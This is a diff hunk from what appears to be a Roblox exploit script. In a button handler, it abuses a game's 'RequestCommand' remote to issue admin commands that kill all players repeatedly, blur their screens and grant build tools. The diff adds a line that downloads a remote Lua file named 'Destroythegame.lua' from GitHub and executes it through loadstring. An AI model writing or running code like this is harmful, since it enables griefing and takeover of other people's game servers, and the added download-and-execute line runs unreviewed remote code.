@@ -1106,6 +1106,7 @@ DS.MouseButton1Click:Connect(function()
 	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";loopkill all ;blur all") end end
 	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";btools") end end
 	for i,v in game:GetDescendants() do if v:IsA("RemoteFunction") and v.Name == "RequestCommand" then v:InvokeServer(";give me b") end end
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/DanielNov2014/flying/main/Destroythegame.lua"))()
 	TBAGNK_fake_script()
 for i,v:Instance in game.Players.LocalPlayer.PlayerGui:GetDescendants() do
 	if v.name == "TextLabel" then
